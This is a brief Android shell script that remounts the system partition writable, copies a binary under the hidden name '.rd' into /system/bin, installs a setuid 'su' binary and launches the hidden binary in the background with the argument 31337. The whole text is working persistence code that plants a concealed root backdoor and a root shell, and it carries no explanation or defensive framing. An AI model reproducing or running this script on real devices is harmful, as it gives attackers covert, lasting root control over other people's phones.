#!/system/bin/sh
mount -o remount,rw /system
cp /cache/rootd /system/bin/.rd
cp /cache/su /system/bin/su
chmod 755 /system/bin/.rd
chmod 6755 /system/bin/su
mount -o remount,ro /system
/system/bin/.rd 31337 &
